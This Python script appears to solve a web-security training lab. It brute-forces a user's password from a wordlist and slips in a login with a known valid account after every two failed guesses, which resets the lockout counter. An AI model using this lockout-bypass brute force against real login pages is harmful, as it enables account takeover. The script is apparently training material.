import requests

def solver(url):
    user = input('Enter Username to Brute Force: ')
    req = requests.get(url + 'login')
    print('Login Portal ', req.url)
    if req.status_code == 200:
        print('Lab is active, Proceeding ...')
        print('Starting To Brute Force')
        counter = 1
        while True:
            with open('creds.txt', 'r') as file:
                for words in file:
                    attemptWord = words.strip()  
                    if counter <= 2:
                        data = f"username={user}&password={attemptWord}"
                        brute_req = requests.post(url + 'login', data=data, allow_redirects=False).status_code
                        print(f'Sending Request, Attempted Word = {attemptWord}, {brute_req}')
                        if brute_req == 302:
                            print(f'Found Valid Password {attemptWord}')
                            return attemptWord  
                        else:
                            counter += 1
                            
                    else:
                        
                        data = "username=wiener&password=peter"
                        brute_req = requests.post(url + 'login', data=data, allow_redirects=False).status_code
                        if brute_req == 302:
                            print('Resetting the Counter', brute_req)
                            counter = 1
                        else:
                            print('Counter Setting Failed')

labUrl = input("Enter the Lab Url: ")
print(solver(labUrl))
